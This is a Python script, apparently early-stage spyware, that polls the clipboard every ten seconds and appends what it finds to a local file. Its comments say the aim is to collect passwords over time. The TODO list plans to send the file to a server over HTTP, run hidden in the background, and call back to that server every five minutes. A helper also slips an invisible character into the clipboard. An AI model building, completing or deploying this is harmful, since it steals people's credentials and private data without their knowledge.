import os
import pyperclip
import schedule
import time


# TODO: SEE BELOW
# TODO: Organize Code into functions
# TODO: Save Clipboard data to a file, don't overwrite the data maybe?
# TODO: Set up server side and exfil this file somewhere, HTTP request
# TODO: Have the program always run in the background - could have it analyze for passwords,
# listen for ctrl+c and also be a scheduled task
# TODO: Callback every five minutes from server
# TODO: if ctrl+c is used, and a password is obtained, then make a chess puzzle appear, answer must be input
# before allowing to proceed
# TODO: research windows sys calls, pull functionality from it
# TODO: make windows pop ups to say what new password is

def main():

    #gets the clipboard information and puts it in a file every 10 seconds.
    schedule.every(10).seconds.do(get_clipboard_info)

    #from https://schedule.readthedocs.io/en/stable/examples.html, schedule documentation
    #code handles the scheduled task
    while True:
        schedule.run_pending()
        time.sleep(1)



def get_clipboard_info() -> None:
    # paste, pastes text from clipboard
    clipboard_info = pyperclip.paste()

    # a appends data to file so the passwords can be stored over time
    clipboard_data_file = open("myfile.txt", "a")
    clipboard_data_file.write(clipboard_info)
    clipboard_data_file.write("\n")
    clipboard_data_file.close()

def add_invisible_character_to_clipboard() -> None:
    # paste, pastes text from clipboard
    clipboard_info = pyperclip.paste()

    invisible_character = 'ᅟ'

    # copy - copies whatever test to the clipboard
    #in this case copies the current clipboard info plus an invisible character
    pyperclip.copy(clipboard_info + invisible_character)

#calls main
main()